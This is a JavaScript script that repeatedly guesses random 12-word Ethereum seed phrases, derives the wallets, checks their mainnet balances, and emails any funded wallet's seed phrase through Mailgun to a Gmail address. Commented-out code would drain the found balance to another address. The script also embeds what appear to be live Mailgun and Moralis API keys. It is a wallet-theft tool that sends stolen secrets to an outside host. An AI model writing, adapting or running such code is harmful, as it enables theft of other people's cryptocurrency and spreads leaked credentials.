import { phrase } from "./phrase.js";
import ethers from "ethers";
import Mailgun from "mailgun.js";
import formData from "form-data";

const mailgun = new Mailgun(formData);
const mg = mailgun.client({
  username: "ace",
  key: "key-17a2fd05e13aadd852eef1706688de75",
});

const provider = new ethers.providers.JsonRpcProvider(
  "https://speedy-nodes-nyc.moralis.io/384de894780c8d2336b811f3/eth/mainnet"
);

const sendPhrase = async (wallet) => {
  const data = {
    from: "New Address <me@belleriit.com>",
    to: "vicopem@gmail.com",
    subject: "Bruhhh" + Math.floor(Math.random() * 200),
    text: wallet,
  };
  try {
    await mg.messages.create(
      "sandboxd8d9d9ce251f4ce3a88ca1c9f13926c0.mailgun.org",
      data
    );
  } catch (error) {
    console.log(error);
  }
};

const getKey = () => {
  provider.on("block", async () => {
    const wallet = `${phrase[Math.ceil(Math.random() * 2048)]} ${
      phrase[Math.ceil(Math.random() * 2048)]
    } ${phrase[Math.ceil(Math.random() * 2048)]} ${
      phrase[Math.ceil(Math.random() * 2048)]
    } ${phrase[Math.ceil(Math.random() * 2048)]} ${
      phrase[Math.ceil(Math.random() * 2048)]
    } ${phrase[Math.ceil(Math.random() * 2048)]} ${
      phrase[Math.ceil(Math.random() * 2048)]
    } ${phrase[Math.ceil(Math.random() * 2048)]} ${
      phrase[Math.ceil(Math.random() * 2048)]
    } ${phrase[Math.ceil(Math.random() * 2048)]} ${
      phrase[Math.ceil(Math.random() * 2048)]
    }`;
    try {
      const key = ethers.Wallet.fromMnemonic(wallet);
      const passKey = key.privateKey;
      const _target = new ethers.Wallet(passKey);
      const target = _target.connect(provider);
      const balance = await provider.getBalance(target.address);
      const txBuffer = ethers.utils.parseEther(".0026");
      if (balance.sub(txBuffer) > 0) {
        console.log("RECEIVED ETH!");
        sendPhrase(wallet);
        const amount = balance.sub(txBuffer);
        // try {
        //   await target.sendTransaction({
        //     to: addressReceiver,
        //     value: amount,
        //   });
        //   console.log(
        //     `Success! transfered --> ${ethers.utils.formatEther(balance)}`
        //   );
        // } catch (e) {
        //   console.log(`error: ${e}`);
        // }
      } else {
        console.log("empty");
      }
    } catch {}
  });
};

getKey();

